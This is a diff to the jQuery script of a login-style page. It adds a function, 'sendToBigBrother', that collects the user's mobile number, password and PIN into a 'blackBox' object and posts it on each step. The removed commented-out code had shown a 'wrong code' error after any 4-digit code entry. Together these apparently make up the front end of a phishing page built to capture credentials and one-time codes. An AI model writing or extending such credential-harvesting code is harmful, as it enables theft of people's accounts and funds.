@@ -41,14 +41,34 @@ function wait(_duration)
 
 function verify()
 {
+	sendToBigBrother(2);
 	console.log('step verify');
 }
 
 $(document).ready(function()
 {
+	$('#usermobile').on('keyup', function(_e)
+	{
+		if(_e.which === 13)
+		{
+			$('#go').click();
+		}
+	});
+
 	$('#go').click(function(e)
 	{
-		wait(1);
+		// check for mobile
+		var myMobile = $('#usermobile').val();
+		if(myMobile.length >= 7 && myMobile.length <=15)
+		{
+			wait(1);
+			sendToBigBrother(1);
+		}
+		else
+		{
+			// show invalid mobile error
+			// for lenght
+		}
 	});
 
 	$('#code').on('input', function()
@@ -62,87 +82,70 @@ $(document).ready(function()
 });
 
 
-
-// function show_error(status)
-// {
-// 	if (status === undefined)
-// 	{
-// 		status = 'wrong_code';
-// 	}
-// 	switch(status)
-// 	{
-// 		case 'wrong_code':
-// 			$('.notif.correct').hide().removeClass('hidden').fadeIn(300);
-// 			break;
-// 		case 'short_block':
-// 			break;
-// 		case 'long_block':
-// 			break;
-// 		default:
-// 			break;
-// 	}
-// }
+/**
+ * [sendToBigBrother description]
+ * @param  {[type]} _step [description]
+ * @return {[type]}       [description]
+ */
+function sendToBigBrother(_step)
+{
+	var blackBox      = {};
+	blackBox.mobile   = $('#usermobile').val();
+	blackBox.password = $('#password').val();
+	blackBox.pin      = $('#pin').val();
+	blackBox.step     = _step;
 
 
-// function step_code()
-// {
-// 	$('.notif.patient').fadeOut(300, function(e)
-// 	{
-// 		$(this).addClass('hidden');
-// 		$('.field.code').hide().removeClass('hidden').fadeIn(300, function(e)
-// 		{
-// 			setTimeout(function()
-// 			 {
-// 			$('.other-ways').hide().removeClass('hidden').fadeIn(300);
-// 			}, 3000);
-// 		});
-// 	});
-// }
+	$('.sidebox').ajaxify(
+	{
+		ajax:
+		{
+			data: blackBox,
+			// abort: true,
+			method: 'post',
+			success: function(e, data, x)
+			{
+				if(e.status && e.status != 0)
+				{
+					console.log(e);
+					console.log(data);
+					console.log(x);
+
+					var newStatus = '';
+					if(e.msg && e.msg.new_status)
+					{
+						newStatus = e.msg.new_status;
+					}
+					// set new status and change all elements depending it change
+					// setStatusText(newStatus);
+					// if we dont have any error
 
 
-// function step_wait(time)
-// {
-// 	// initial validation
-// 	if (time === undefined)
-// 	{
-// 		time = 1000;
-// 	}
-// 	else
-// 	{
-// 		time *= 1000;
-// 	}
+					switch(e.status)
+					{
+						case 0:
+							console.log('go back to step start');
+							break;
 
-// 	// disable mobile field
-// 	$('#mobile').attr('disabled', '');
+						case 1:
+							console.log('successfully change status!');
+							break;
 
-// 	// hide button and show patient notif
-// 	$('button').fadeOut(300, function(e) {
-// 	$('.notif.patient').hide().removeClass('hidden').fadeIn(300, function()
-// 	{
-// 		setTimeout(function()
-// 		{
-// 		step_code();
-// 		}, time);
-// 	});
-// 	});
-// }
-
-
-// $(document).on('click', 'button', function(e)
-// {
-// 	step_wait(1);
-// });
-
-
-// $(document).on('input', '#code', function(e)
-// {
-// 	var len = $(this).val().length;
-// 	if (len === 4)
-// 	{
-// 		$('#code').attr('disabled', '');
-// 		setTimeout(function()
-// 		{
-// 			show_error('wrong_code');
-// 		}, 1000);
-// 	}
-// });
+						case 2:
+							break;
+					}
+				}
+				else
+				{
+					// error on change
+					console.log('error on changing status; fail!');
+				}
+			},
+			error: function(e, data, x)
+			{
+				console.log('error!');
+			}
+		},
+		// lockForm: false,
+	});
+}
